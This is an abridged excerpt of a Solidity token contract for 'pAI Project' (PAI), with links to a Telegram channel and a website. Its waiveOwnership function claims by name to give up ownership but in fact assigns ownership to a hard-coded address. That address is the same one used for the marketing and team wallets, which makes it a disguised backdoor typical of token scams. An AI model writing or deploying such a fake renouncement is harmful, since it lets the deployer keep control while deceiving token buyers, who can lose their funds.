...
/**
Telegram :https://t.me/pAiprojectofc
Web :  https://projectpai.com/
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xFd8f350A972C1F9d3Edf6a4bEcC564D80A353985);
    }
...
contract pAI is Context, IERC20, Ownable {
    ...
    string private _name = "pAI Project";
    string private _symbol = "PAI";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xFd8f350A972C1F9d3Edf6a4bEcC564D80A353985);
    address payable public teamWalletAddress = payable(0xFd8f350A972C1F9d3Edf6a4bEcC564D80A353985);
